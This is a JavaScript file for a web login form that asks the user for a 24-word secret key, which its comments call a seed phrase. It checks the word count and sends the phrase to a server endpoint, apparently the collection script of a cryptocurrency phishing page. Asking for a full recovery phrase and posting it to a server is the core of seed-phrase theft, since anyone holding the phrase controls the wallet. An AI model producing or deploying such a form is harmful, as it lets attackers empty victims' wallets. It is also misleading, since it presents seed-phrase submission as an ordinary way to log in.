// Wait for the document to be fully loaded before attaching event listeners
document.addEventListener("DOMContentLoaded", () => {
    
    // Get references to the form and its elements
    const loginForm = document.getElementById("key-login-form");
    const keyInput = document.getElementById("secret-key-input");
    const errorMessage = document.getElementById("error-message");
    const loginButton = document.getElementById("login-button");

    // Add a submit event listener to the form
    loginForm.addEventListener("submit", async (event) => {
        // Prevent the default browser form submission
        event.preventDefault(); 
        
        // Get the value from the textarea and trim whitespace
        const secretKey = keyInput.value.trim();

        // Basic validation
        if (secretKey === "") {
            showError("Secret key cannot be empty.");
            return;
        }

        // Optional: Count words (a typical seed phrase is 12 or 24 words)
        const wordCount = secretKey.split(/\s+/).filter(Boolean).length;
        if (wordCount !== 24) {
            showError(`Please enter your 24-word key. You entered ${wordCount}.`);
            return;
        }
        
        // If validation passes, clear errors and show loading state
        showError(""); // Clear any previous errors
        loginButton.textContent = "Accessing...";
        loginButton.disabled = true;

        // Send the data to the Django endpoint
        try {
            const response = await sendKeyToServer(secretKey);
            
            // Log the server's response to the console
            console.log("Server response:", response);

            // You would redirect or update the UI here on success
            // For this example, we just log it.
            loginButton.textContent = "Success!";
            // Example: window.location.href = "/dashboard";
            
        } catch (error) {
            // Handle errors from the fetch call
            console.error("Login failed:", error);
            showError("Login failed. Please try again.");
            loginButton.textContent = "Access Now";
            loginButton.disabled = false;
        }
    });

    /**
     * Sends the secret key to the server.
     * @param {string} key - The 24-word secret key.
     */
    async function sendKeyToServer(key) {
        const payload = {
            secret_key: key
        };

        const response = await fetch("/api/key-login/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            // Throw an error if the server response is not 2xx
            throw new Error(`Server error: ${response.statusText}`);
        }

        // Parse and return the JSON response from the server
        return await response.json();
    }

    /**
     * Displays an error message to the user.
     * @param {string} message - The error message to display.
     */
    function showError(message) {
        errorMessage.textContent = message;
        // Show or hide the error message element based on content
        errorMessage.style.display = message ? "block" : "none";
    }
});
